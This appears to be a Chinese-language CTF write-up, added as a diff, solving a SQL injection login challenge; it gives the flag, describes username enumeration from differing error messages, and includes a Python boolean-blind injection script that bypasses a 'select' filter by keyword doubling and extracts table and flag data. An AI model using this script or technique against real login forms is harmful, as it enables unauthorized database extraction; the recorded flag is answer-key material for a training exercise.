@@ -1,0 +1,69 @@
+---
+Author: SuperJason
+Date: 2020-12-18
+---
+
+## flag
+`n1book{login_sqli_is_nice}`
+
+## 思路
+1. 访问环境时显示403，可以遍历一下常用的入口文件`index.php、admin.php、webshell.php、login.php`等，此处题目给了提示`login.php、user.php`
+2. login.php界面有两种错误反馈，测试出**admin**账户存在
+    - 账号或密码错误
+    - 账号不存在
+3. 与[sql注入-1](./sql注入-1.md)原理相同，判断出用户名处存在字符型sql注入
+    ![](./images/sql2-1.png)   
+    ![](./images/sql2-2.png)
+4. 进一步发现union select注入，由于不展示select到的值，有两个结果作为返回值，开始写脚本进行盲注。
+```python
+# -*- coding: utf-8 -*-
+# @Date    : 2020-12-18
+# @Author  : SuperJason
+import requests
+import string
+
+url = 'http://092604a0-af99-4453-aedd-215fff67f97e.node3.buuoj.cn/login.php'
+flag = ''
+trueflag='8bef'
+falseflag='5728'
+dic = string.digits + string.ascii_letters + "!@#$%^&*()_+{}-="
+
+# select过滤
+for i in range(1,50):
+# 由于服务器限制了访问请求，上述for循环可以每次遍历少一点的数量，例如1-5,5-10,....
+    # 可打印字符的ASCII码在33-128之间
+    left = 32
+    right = 127
+
+    while right - left != 1:
+        mid = (right + left) // 2        
+        # target = 'select database()'        
+        # target = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
+        # target = 'select group_concat(column_name) from information_schema.columns where table_name="fl4g"'
+        target = 'select flag from fl4g'
+
+        payload = "'and (ascii(substr(({}), {}, 1))>{})#".format(target, i, mid)
+        #payload = payload.replace('from', 'frfromom')
+        payload = payload.replace('select', 'selselectect')
+        #payload = payload.replace('or', 'oorr')
+        #payload = payload.replace('where', 'whwhereere')
+        # 此处需要通过burpsuite等工具获得post的参数名
+        data = {
+            "name": "admin"+payload,
+            "pass": 1
+        }
+
+        content = requests.post(url, data = data).text
+        if trueflag in content:
+            left = mid
+        else:
+            right = mid
+    flag += chr(right)
+    print (flag)
+
+# note
+# fl4g,usc
+# flag
+# n1book{login_sqli_is_nice}
+
+```
